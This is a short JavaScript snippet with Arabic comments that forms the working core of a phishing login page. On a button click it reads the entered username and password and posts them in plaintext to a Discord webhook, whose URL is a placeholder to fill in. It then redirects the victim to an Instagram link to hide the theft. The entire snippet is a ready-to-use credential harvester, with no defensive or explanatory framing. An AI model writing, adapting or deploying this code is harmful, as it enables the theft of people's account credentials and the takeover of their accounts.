document.getElementById('loginButton').addEventListener('click', function (e) {
  e.preventDefault(); // لمنع إعادة تحميل الصفحة

  // التقاط البيانات من النموذج
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  // إعداد الرسالة للإرسال
  var message = {
    content: "**New login attempt:**\n**Username:** " + username + "\n**Password:** " + password
  };

  // رابط Webhook الخاص بديسكورد
  var webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // استبدله برابط الـ Webhook

  // إرسال البيانات عبر الـ Fetch API
  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(message)
  })
  .then(response => response.json())
  .then(data => {
    console.log("Message sent successfully:", data);
    
    // إعادة التوجيه بعد نجاح الإرسال
    window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
  })
  .catch(error => {
    console.error("Error sending message:", error);
  });
});
